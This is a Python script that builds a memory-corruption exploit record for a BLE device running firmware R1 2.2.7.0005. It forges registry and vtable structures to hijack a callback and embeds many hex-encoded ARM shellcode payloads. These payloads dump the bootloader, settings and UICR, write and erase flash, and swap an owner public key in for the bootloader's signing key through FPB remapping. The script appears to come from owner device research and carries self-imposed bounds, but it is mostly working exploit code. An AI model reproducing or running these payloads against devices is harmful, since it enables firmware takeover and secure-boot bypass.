#!/usr/bin/env python3
"""Build version-pinned ACE validation records for R1 application 2.2.7.0005.

The record targets the channel-1 structured-command overflow and redirects the
registry's first-listener callback into a small RAM stub. Read-only modes report
Boolean outcomes through reset behavior. Flash modes are bounded to the inactive
ACL gap; no mode writes UICR, settings, bootloader, or application-image flash.
The MBR vector probe supplies only an out-of-range address and expects rejection
before the MBR writes its parameter page.
"""

from __future__ import annotations

import argparse
import hashlib
import json
import struct
from pathlib import Path


EXPECTED_APPLICATION_SHA256 = (
    "2d38253e00b887ced3f1e2c049db21254b0974091bc954a82c13e21c48b064c2"
)
RECORD_LENGTH = 244
STAGING_BASE = 0x2001A18C
REGISTRY_HEADER_OFFSET = 0x3C
FAKE_NODE_OFFSET = 0x48
FAKE_OBJECT_OFFSET = 0x60
VTABLE_OFFSET = 0x9C
SHELLCODE_OFFSET = 0xA0

# Built from r1_227_dfu_proof.S for ARMv7E-M Thumb. It writes 0xB1 to
# NRF_POWER->GPREGRET, requests SYSRESETREQ, and loops while reset completes.
DFU_PROOF_SHELLCODE = bytes.fromhex(
    "0449b1200870bff34f8f034903480860fee700001c0500400ced00e00400fa05"
)

# Built from r1_227_boot_config_probe.S. It reads MBR_BOOTLOADER_ADDR and
# UICR NRFFW[0], requests DFU only when they are 0xffffffff and 0x000f8000,
# respectively, and otherwise resets to the installed application.
BOOT_CONFIG_PROBE_SHELLCODE = bytes.fromhex(
    "40f6f87001684ff0ff32914207d1084801684ff47822914201d1b12000e00020"
    "04490870bff34f8f034904480860fee7141000101c0500400ced00e00400fa05"
)

MBR_ERASED_PROBE_SHELLCODE = bytes.fromhex(
    "40f6f87001684ff0ff32914201d1b12000e0002003490870bff34f8f02490348"
    "0860fee71c0500400ced00e00400fa05"
)

MBR_F8000_PROBE_SHELLCODE = bytes.fromhex(
    "40f6f87001684ff47822914201d1b12000e0002003490870bff34f8f02490348"
    "0860fee71c0500400ced00e00400fa05"
)

UICR_F8000_PROBE_SHELLCODE = bytes.fromhex(
    "084801684ff47822914201d1b12000e0002005490870bff34f8f044904480860"
    "fee70000141000101c0500400ced00e00400fa05"
)

# Built from r1_227_mbr_vector_probe.S. It calls the MBR SVC with command 4
# and address 0x00100000, exactly outside the nRF52840 flash. The expected
# NRF_ERROR_INVALID_ADDR return enters DFU. No valid redirect is requested.
MBR_VECTOR_INVALID_PROBE_SHELLCODE = bytes.fromhex(
    "82b0042000904ff480100190684618df102801d1b12000e0002002b003490870"
    "bff34f8f024903480860fee71c0500400ced00e00400fa05"
)

# Built from r1_227_flash_cycle_probes.S. The write probe refuses a non-erased
# 0x000c6000 first word, then writes and verifies one marker. The erase probe is
# the paired cleanup and verifies that first word returns to 0xffffffff.
FLASH_WRITE_PROBE_SHELLCODE = bytes.fromhex(
    "4ff4462420684ff0ff3188420ad111df094d0120a847094e26602068b04201d1"
    "b12000e0002006490870bff34f8f054905480860fee70000a1d2070052575331"
    "1c0500400ced00e00400fa05"
)

FLASH_ERASE_PROBE_SHELLCODE = bytes.fromhex(
    "4ff4462411df0b4d0220a8470a490c600020a84720684ff0ff31884201d1b120"
    "00e0002005490870bff34f8f044905480860fee7a1d2070008e501401c050040"
    "0ced00e00400fa05"
)

C6000_ERASED_PROBE_SHELLCODE = bytes.fromhex(
    "4ff4462001684ff0ff32914201d1b12000e0002003490870bff34f8f02490348"
    "0860fee71c0500400ced00e00400fa05"
)

D3000_ERASED_PROBE_SHELLCODE = bytes.fromhex(
    "4ff4532001684ff0ff32914201d1b12000e0002003490870bff34f8f02490348"
    "0860fee71c0500400ced00e00400fa05"
)

DYNAMIC_ERASED_PROBE_SHELLCODE = bytes.fromhex(
    "084801684ff0ff32914201d1b12000e0002005490870bff34f8f044904480860"
    "fee700bfefbeadde1c0500400ced00e00400fa05"
)

DYNAMIC_WRITE_PROBE_SHELLCODE = bytes.fromhex(
    "0c4c20684ff0ff3188420ad111df0a4d0120a847094e26602068b04201d1b120"
    "00e0002006490870bff34f8f054906480860fee7efbeaddea1d2070052575331"
    "1c0500400ced00e00400fa05"
)

DYNAMIC_ERASE_PROBE_SHELLCODE = bytes.fromhex(
    "0c4c11df0c4d0220a8470c490c600020a84720684ff0ff31884201d1b12000e0"
    "002007490870bff34f8f064906480860fee700bfefbeaddea1d2070008e50140"
    "1c0500400ced00e00400fa05"
)

# Built from r1_227_bootloader_dump.S. It streams the CPU-readable bootloader
# mapping as consecutive 244-byte EUS notifications and then resets to the app.
# The final notification is truncated by the receiver at exact end 0xFE000.
BOOTLOADER_DUMP_SHELLCODE = bytes.fromhex(
    "82b0012000904ff4782404f5c0450d4e0d4ff42001903846214601aa0023b047"
    "002802d01328f4d007e004f1f404ac42efd34ff000700138fdd1044904480860"
    "fee7000069290500146500200ced00e00400fa05"
)

# Built from r1_227_bootloader_prefix_dump.S. It emits exactly one 244-byte
# notification from 0xF8000, allowing the live EUS route to be validated
# without a sustained notification burst.
BOOTLOADER_PREFIX_DUMP_SHELLCODE = bytes.fromhex(
    "82b001200090f42001900b4c0b4d0c4e00272846314601aa3b46a047002803d0"
    "002f05d10127f4e74ff000700138fdd1044905480860fee76929050014650020"
    "efbeadde0ced00e00400fa05"
)
BOOTLOADER_PREFIX_TARGET_OFFSET = 0x40

# Built from r1_227_bootloader_page_dump.S. It emits one aligned 4 KiB page
# using the live handle-0 EUS route proven by the bounded chunk reads.
BOOTLOADER_PAGE_DUMP_SHELLCODE = bytes.fromhex(
    "82b0012000900f4c04f580550e4e0f4ff42001903846214601aa01232b40b047"
    "002805d01328f3d0eb0709d40135efe704f1f404ac42ebd34ff000700138fdd1"
    "03488047efbeadde692905001465002091810300"
)
BOOTLOADER_PAGE_TARGET_OFFSET = 0x44

# Built from r1_227_settings_dump.S. It streams the backup and primary Nordic
# DFU settings pages (0xFE000...0xFFFFF) without modifying either page.
SETTINGS_DUMP_SHELLCODE = bytes.fromhex(
    "82b0012000904ff47e2404f500550d4e0d4ff42001903846214601aa0123b047"
    "002802d01328f4d007e004f1f404ac42efd34ff000700138fdd1044904480860"
    "fee7000069290500146500200ced00e00400fa05"
)

# One-page variants keep the notification burst below the observed live-link
# queue timeout while preserving the exact same read-only implementation.
SETTINGS_BACKUP_DUMP_SHELLCODE = bytes.fromhex(
    "82b0012000904ff47e2404f580550d4e0d4ff42001903846214601aa0123b047"
    "002802d01328f4d007e004f1f404ac42efd34ff000700138fdd1044904480860"
    "fee7000069290500146500200ced00e00400fa05"
)

SETTINGS_PRIMARY_DUMP_SHELLCODE = bytes.fromhex(
    "82b0012000904ff47f2404f580550d4e0d4ff42001903846214601aa0123b047"
    "002802d01328f4d007e004f1f404ac42efd34ff000700138fdd1044904480860"
    "fee7000069290500146500200ced00e00400fa05"
)

# Built from r1_227_uicr_dump.S. It streams the architected 0x308-byte UICR
# block, including NRFFW, APPROTECT, and DEBUGCTRL. The receiver truncates the
# last 244-byte notification at 0x10001308. No NVMC or configuration write is
# performed.
UICR_DUMP_SHELLCODE = bytes.fromhex(
    "82b0012000904ff0102404f542750d4e0d4ff42001903846214601aa0123b047"
    "002802d01328f4d007e004f1f404ac42efd34ff000700138fdd1044904480860"
    "fee7000069290500146500200ced00e00400fa05"
)

# Built from r1_227_approtect_runtime_dump.S. It reports the FICR revision
# pair used by Nordic erratum 249, then the live APPROTECT DISABLE register.
# It performs no peripheral/configuration write.
APPROTECT_RUNTIME_DUMP_SHELLCODE = bytes.fromhex(
    "86b0012000900c2001900b4c03cccde902010a4ca0680490094e0a4802a901aa"
    "0123b0471328f8d04ff000700138fdd1054906480860fee73001001050050040"
    "69290500146500200ced00e00400fa05"
)

# Built from r1_227_nfct_runtime_dump.S. It reports NFCT INTENSET, PACKETPTR,
# and MAXLEN without triggering a task or writing a peripheral register.
NFCT_RUNTIME_DUMP_SHELLCODE = bytes.fromhex(
    "86b0012000900c2001900d4cd4f80403029004f5a064d4e90401cde90301094e"
    "094802a901aa0123b0471328f8d04ff000700138fdd1054905480860fee70000"
    "0050004069290500146500200ced00e00400fa05"
)

# Built from r1_227_st25_runtime_dump.S. It directly reads the application's
# ST25 initialization flag and NFC task state without calling the I2C driver.
ST25_RUNTIME_DUMP_SHELLCODE = bytes.fromhex(
    "86b0012000900c2001900c4c206802900b4cd4e90001cde903010a4e0a4802a9"
    "01aa0123b0471328f8d04ff000700138fdd1064906480860fee7000070680020"
    "206b012069290500146500200ced00e00400fa05"
)

# Volatile, non-flash FPB reset-retention pair.  The arm stage targets the
# unreachable 0x00100000 address, stages one canary word in upper SRAM, enables
# comparator 0, clears GPREGRET, and requests an ordinary soft reset.  The
# follow-up checks Debug/RAM retention, disables FPB and comparator 0, and uses
# the already proven GPREGRET advertisement predicate to report the result.
FPB_RETENTION_ARM_SHELLCODE = bytes.fromhex(
    "0b480c4901600c4a0221116050600b49916003211160bff34f8fbff36f8f0848"
    "00210170bff34f8f064907480860fee700c0032052425046002000e001001000"
    "1c0500400ced00e00400fa05"
)

FPB_RETENTION_CHECK_SHELLCODE = bytes.fromhex(
    "0e4c00202168c9070bd561680c4a914207d1a168c90704d511680a4b994200d1"
    "b120022121600021a16007490870bff34f8f064906480860fee70000002000e0"
    "00c00320524250461c0500400ced00e00400fa05"
)

# Three-stage owner-key substitution support. The stage record carries the
# generated 64-byte public key in command bytes unused by the forged registry,
# the arm record supplies seven constants at record offset 0x04, and cleanup
# disables literal comparator 6 before zeroing the retained table/key/canary.
FPB_KEY_STAGE_SHELLCODE = bytes.fromhex(
    "0d480e490e2250f8043b0b600431013af9d10b48022250f8043b0b600431013a"
    "f9d108480860084800210170bff34f8f064907480860fee790a1012040c00320"
    "e4a101203159454b1c0500400ced00e00400fa05"
)

FPB_KEY_ARM_SHELLCODE = bytes.fromhex(
    "0d4d1fcdd0f880608e420ed100f140068661022616605060136203261660bff3"
    "4f8fbff36f8fb12600e000262670c0cdbff34f8f3760fee790a10120"
)

FPB_KEY_CLEANUP_SHELLCODE = bytes.fromhex(
    "094c02212160002020620849212241f8040b013afbd106490870bff34f8f0549"
    "05480860fee70000002000e000c003201c0500400ced00e00400fa05"
)

FPB_KEY_ARM_CONSTANTS = (
    0x2003C000,  # retained remap-table base
    0x4B455931,  # stage-complete canary
    0xE0002000,  # FPB base
    0x000FA6ED,  # literal comparator 6: source word 0xFA6EC + enable
    0x4000051C,  # POWER.GPREGRET
    0xE000ED0C,  # SCB.AIRCR
    0x05FA0004,  # AIRCR VECTKEY + SYSRESETREQ
)

DYNAMIC_TARGET_OFFSETS = {
    "gap-erased": 0x24,
    "gap-write": 0x34,
    "gap-erase": 0x34,
}

PROBES = {
    "dfu-proof": (
        DFU_PROOF_SHELLCODE,
        "sets GPREGRET=0xB1 and requests reset; no flash/UICR write",
    ),
    "boot-config": (
        BOOT_CONFIG_PROBE_SHELLCODE,
        "reads 0xFF8 and UICR NRFFW[0]; matching values enter DFU; no flash/UICR write",
    ),
    "mbr-erased": (
        MBR_ERASED_PROBE_SHELLCODE,
        "reads 0xFF8; an erased value enters DFU; no flash/UICR write",
    ),
    "mbr-f8000": (
        MBR_F8000_PROBE_SHELLCODE,
        "reads 0xFF8; 0x000F8000 enters DFU; no flash/UICR write",
    ),
    "uicr-f8000": (
        UICR_F8000_PROBE_SHELLCODE,
        "reads UICR NRFFW[0]; 0x000F8000 enters DFU; no flash/UICR write",
    ),
    "mbr-vector-invalid": (
        MBR_VECTOR_INVALID_PROBE_SHELLCODE,
        "calls MBR vector-base command with out-of-flash 0x100000; expected rejection enters DFU; no valid redirect or flash write",
    ),
    "flash-write": (
        FLASH_WRITE_PROBE_SHELLCODE,
        "writes and verifies marker 0x31535752 at erased 0xC6000; no UICR/bootloader write",
    ),
    "flash-erase": (
        FLASH_ERASE_PROBE_SHELLCODE,
        "erases and verifies cleanup page 0xC6000; no UICR/bootloader write",
    ),
    "c6000-erased": (
        C6000_ERASED_PROBE_SHELLCODE,
        "reads 0xC6000; an erased first word enters DFU; no flash/UICR write",
    ),
    "d3000-erased": (
        D3000_ERASED_PROBE_SHELLCODE,
        "reads 0xD3000; an erased first word enters DFU; no flash/UICR write",
    ),
    "gap-erased": (
        DYNAMIC_ERASED_PROBE_SHELLCODE,
        "reads a constrained inactive-gap word and enters DFU only when erased",
    ),
    "gap-write": (
        DYNAMIC_WRITE_PROBE_SHELLCODE,
        "writes and verifies one marker at a constrained erased inactive-gap page",
    ),
    "gap-erase": (
        DYNAMIC_ERASE_PROBE_SHELLCODE,
        "erases and verifies the paired constrained inactive-gap cleanup page",
    ),
    "bootloader-dump": (
        BOOTLOADER_DUMP_SHELLCODE,
        "reads 0xF8000...0xFDFFF into EUS notifications; no flash/UICR write",
    ),
    "bootloader-prefix-dump": (
        BOOTLOADER_PREFIX_DUMP_SHELLCODE,
        "reads exactly 244 bytes at a constrained bootloader address into one EUS notification; no flash/UICR write",
    ),
    "bootloader-page-dump": (
        BOOTLOADER_PAGE_DUMP_SHELLCODE,
        "reads one aligned 4 KiB bootloader page into EUS notifications; no flash/UICR write",
    ),
    "settings-dump": (
        SETTINGS_DUMP_SHELLCODE,
        "reads 0xFE000...0xFFFFF into EUS notifications; no flash/UICR write",
    ),
    "settings-backup-dump": (
        SETTINGS_BACKUP_DUMP_SHELLCODE,
        "reads protected backup page 0xFE000...0xFEFFF; no flash/UICR write",
    ),
    "settings-primary-dump": (
        SETTINGS_PRIMARY_DUMP_SHELLCODE,
        "reads primary page 0xFF000...0xFFFFF; no flash/UICR write",
    ),
    "uicr-dump": (
        UICR_DUMP_SHELLCODE,
        "reads UICR 0x10001000...0x10001307 into EUS notifications; no NVMC/UICR write",
    ),
    "approtect-runtime-dump": (
        APPROTECT_RUNTIME_DUMP_SHELLCODE,
        "reads FICR revision and live APPROTECT DISABLE into one EUS notification; no peripheral/configuration write",
    ),
    "nfct-runtime-dump": (
        NFCT_RUNTIME_DUMP_SHELLCODE,
        "reads NFCT INTENSET, PACKETPTR, and MAXLEN into one EUS notification; no NFCT task or register write",
    ),
    "st25-runtime-dump": (
        ST25_RUNTIME_DUMP_SHELLCODE,
        "reads the ST25 init flag and NFC task state into one EUS notification; no function/ST25/flash/UICR/settings/ACL write",
    ),
    "fpb-retention-arm": (
        FPB_RETENTION_ARM_SHELLCODE,
        "stages a volatile FPB comparator for unreachable 0x00100000 and soft-resets; no flash/UICR/settings/ACL write",
    ),
    "fpb-retention-check": (
        FPB_RETENTION_CHECK_SHELLCODE,
        "checks FPB/RAM retention, disables FPB comparator 0, and enters DFU only on exact match; no flash/UICR/settings/ACL write",
    ),
    "fpb-key-stage": (
        FPB_KEY_STAGE_SHELLCODE,
        "stages the owner public key and a completion canary in volatile retained upper SRAM, then resets to the application",
    ),
    "fpb-key-arm": (
        FPB_KEY_ARM_SHELLCODE,
        "arms literal comparator 6 for bootloader key pointer 0xFA6EC and enters genuine DFU only when the retained-key canary is present",
    ),
    "fpb-key-cleanup": (
        FPB_KEY_CLEANUP_SHELLCODE,
        "disables FPB comparator 6, zeroes the retained remap table/key/canary, and resets to the application",
    ),
}


def put_u32(record: bytearray, offset: int, value: int) -> None:
    struct.pack_into("<I", record, offset, value)


def build_record(shellcode_bytes: bytes = DFU_PROOF_SHELLCODE) -> bytes:
    if len(shellcode_bytes) > RECORD_LENGTH - SHELLCODE_OFFSET:
        raise ValueError("shellcode does not fit in the 244-byte overwrite record")
    record = bytearray(RECORD_LENGTH)

    # Structured command 0x40, subcommand 4 starts the factory listener when idle.
    record[2] = 0x40
    record[3] = 0x04

    fake_node = STAGING_BASE + FAKE_NODE_OFFSET
    fake_object = STAGING_BASE + FAKE_OBJECT_OFFSET
    vtable = STAGING_BASE + VTABLE_OFFSET
    shellcode = STAGING_BASE + SHELLCODE_OFFSET

    # Corrupted global registry list: element size 8, one fake node.
    put_u32(record, REGISTRY_HEADER_OFFSET + 0, 8)
    put_u32(record, REGISTRY_HEADER_OFFSET + 4, fake_node)
    put_u32(record, REGISTRY_HEADER_OFFSET + 8, fake_node)

    # Node layout: link, stored object pointer, and terminating next link.
    put_u32(record, FAKE_NODE_OFFSET + 0, 0)
    put_u32(record, FAKE_NODE_OFFSET + 4, fake_object)
    put_u32(record, FAKE_NODE_OFFSET + 12, 0)

    # Minimal fake "acc" registry object accepted by the listener constructor.
    record[FAKE_OBJECT_OFFSET : FAKE_OBJECT_OFFSET + 4] = b"acc\0"
    put_u32(record, FAKE_OBJECT_OFFSET + 0x0C, vtable)
    put_u32(record, FAKE_OBJECT_OFFSET + 0x1C, 1)  # sample element size
    put_u32(record, FAKE_OBJECT_OFFSET + 0x24, 0)  # callback argument
    put_u32(record, FAKE_OBJECT_OFFSET + 0x2C, 0x18)  # listener-list element size
    put_u32(record, FAKE_OBJECT_OFFSET + 0x30, 0)
    put_u32(record, FAKE_OBJECT_OFFSET + 0x34, 0)

    # The constructor calls **(object + 0x0c) as a Thumb function.
    put_u32(record, VTABLE_OFFSET, shellcode | 1)
    record[SHELLCODE_OFFSET : SHELLCODE_OFFSET + len(shellcode_bytes)] = shellcode_bytes
    return bytes(record)


def verify_application(path: Path) -> str:
    digest = hashlib.sha256(path.read_bytes()).hexdigest()
    if digest != EXPECTED_APPLICATION_SHA256:
        raise SystemExit(
            f"refusing non-2.2.7.0005 image: SHA-256 {digest}, "
            f"expected {EXPECTED_APPLICATION_SHA256}"
        )
    return digest


def main() -> None:
    parser = argparse.ArgumentParser()
    parser.add_argument(
        "--application",
        type=Path,
        required=True,
        help="path to the exact R1 2.2.7.0005 application.bin",
    )
    parser.add_argument(
        "--mode",
        choices=sorted(PROBES),
        default="dfu-proof",
        help="bounded proof payload to embed in the version-pinned overwrite record",
    )
    parser.add_argument(
        "--target",
        type=lambda value: int(value, 0),
        help="4 KiB-aligned 0xC6000...0xD3000 target for gap-* modes",
    )
    parser.add_argument(
        "--owner-public-key",
        type=Path,
        default=Path(__file__).resolve().parents[1]
        / "config"
        / "r1-owner-signing"
        / "r1-owner-public-x-y-le.bin",
        help="64-byte little-endian P-256 X || Y key used by fpb-key-stage",
    )
    parser.add_argument("--output", type=Path, help="optional 244-byte output file")
    args = parser.parse_args()

    digest = verify_application(args.application)
    shellcode, effect = PROBES[args.mode]
    if args.mode == "bootloader-page-dump":
        if args.target is None:
            raise SystemExit("--target is required for bootloader-page-dump")
        if not 0xF8000 <= args.target <= 0xFD000 or args.target % 0x1000 != 0:
            raise SystemExit("refusing non-page-aligned bootloader read target")
        patched = bytearray(shellcode)
        struct.pack_into("<I", patched, BOOTLOADER_PAGE_TARGET_OFFSET, args.target)
        shellcode = bytes(patched)
        effect = f"{effect}; target={args.target:#x}"
    elif args.mode == "bootloader-prefix-dump":
        if args.target is None:
            raise SystemExit("--target is required for bootloader-prefix-dump")
        if not 0xF8000 <= args.target <= 0xFE000 - RECORD_LENGTH:
            raise SystemExit("refusing read outside bootloader 0xF8000...0xFDFFF")
        patched = bytearray(shellcode)
        struct.pack_into("<I", patched, BOOTLOADER_PREFIX_TARGET_OFFSET, args.target)
        shellcode = bytes(patched)
        effect = f"{effect}; target={args.target:#x}"
    elif args.mode in DYNAMIC_TARGET_OFFSETS:
        if args.target is None:
            raise SystemExit(f"--target is required for {args.mode}")
        if not 0xC6000 <= args.target <= 0xD3000 or args.target % 0x1000 != 0:
            raise SystemExit("refusing target outside aligned inactive gap 0xC6000...0xD3000")
        patched = bytearray(shellcode)
        struct.pack_into("<I", patched, DYNAMIC_TARGET_OFFSETS[args.mode], args.target)
        shellcode = bytes(patched)
        effect = f"{effect}; target={args.target:#x}"
    record = bytearray(build_record(shellcode))
    owner_public_key_sha256 = None
    if args.mode == "fpb-key-stage":
        owner_public_key = args.owner_public_key.read_bytes()
        if len(owner_public_key) != 64:
            raise SystemExit("owner public key must be exactly 64 bytes")
        # Offsets 0x04...0x3b and 0x58...0x5f are not consumed by the
        # registry/object shape that reaches the controlled callback.
        record[0x04:0x3C] = owner_public_key[:56]
        record[0x58:0x60] = owner_public_key[56:]
        owner_public_key_sha256 = hashlib.sha256(owner_public_key).hexdigest()
    elif args.mode == "fpb-key-arm":
        for index, value in enumerate(FPB_KEY_ARM_CONSTANTS):
            put_u32(record, 0x04 + index * 4, value)
    record = bytes(record)
    if args.output is not None:
        args.output.write_bytes(record)

    print(
        json.dumps(
            {
                "firmware_sha256": digest,
                "mode": args.mode,
                "length": len(record),
                "staging_base": hex(STAGING_BASE),
                "registry_header": hex(STAGING_BASE + REGISTRY_HEADER_OFFSET),
                "fake_node": hex(STAGING_BASE + FAKE_NODE_OFFSET),
                "fake_object": hex(STAGING_BASE + FAKE_OBJECT_OFFSET),
                "shellcode": hex(STAGING_BASE + SHELLCODE_OFFSET),
                "payload_sha256": hashlib.sha256(record).hexdigest(),
                "payload_hex": record.hex(),
                "effect": effect,
                "owner_public_key_sha256": owner_public_key_sha256,
            },
            indent=2,
        )
    )


if __name__ == "__main__":
    main()
